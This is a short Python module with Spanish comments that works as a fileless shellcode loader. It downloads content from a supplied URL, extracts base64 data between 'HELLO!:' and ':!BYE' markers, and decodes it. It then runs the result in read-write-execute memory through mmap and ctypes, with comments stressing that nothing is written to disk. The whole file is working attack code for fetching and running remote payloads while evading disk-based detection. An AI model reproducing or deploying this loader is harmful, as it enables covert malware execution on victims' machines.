import re
import base64
import ctypes
import mmap
import requests

PAYLOAD_START = "HELLO!:"
PAYLOAD_END   = ":!BYE"

# Descarga el contenido HTML/texto de la URL del payload
def _download_content(url: str) -> str | None:
    try:
        resp = requests.get(url, timeout=10)
        resp.raise_for_status()
        return resp.text
    except Exception:
        return None

# Extrae el payload en base64 entre los delimitadores
def _extract_b64(content: str) -> str | None:
    pattern = re.escape(PAYLOAD_START) + r"(.*?)" + re.escape(PAYLOAD_END)
    match = re.search(pattern, content, re.DOTALL)
    if match:
        return match.group(1).strip()
    return None

# Decodifica base64
def _decode_shellcode(b64_data: str) -> bytes | None:
    try:
        return base64.b64decode(b64_data)
    except Exception:
        return None

# Aloja el shellcode en memoria RWX con mmap y lo ejecuta vía ctypes sin escribir nada en disco
def _execute_shellcode(shellcode: bytes) -> None:
    size = len(shellcode)
    mem = mmap.mmap(
        -1, size,
        prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
    )
    mem.write(shellcode)
    mem.seek(0)

    buf      = (ctypes.c_char * size).from_buffer(mem)
    func_ptr = ctypes.cast(ctypes.addressof(buf), ctypes.CFUNCTYPE(None))
    func_ptr()

# Punto de entrada del módulo
def fetch_and_execute(url: str) -> bool:
    content = _download_content(url)
    if not content:
        return False

    b64_data = _extract_b64(content)
    if not b64_data:
        return False

    shellcode = _decode_shellcode(b64_data)
    if not shellcode:
        return False

    _execute_shellcode(shellcode)
    return True
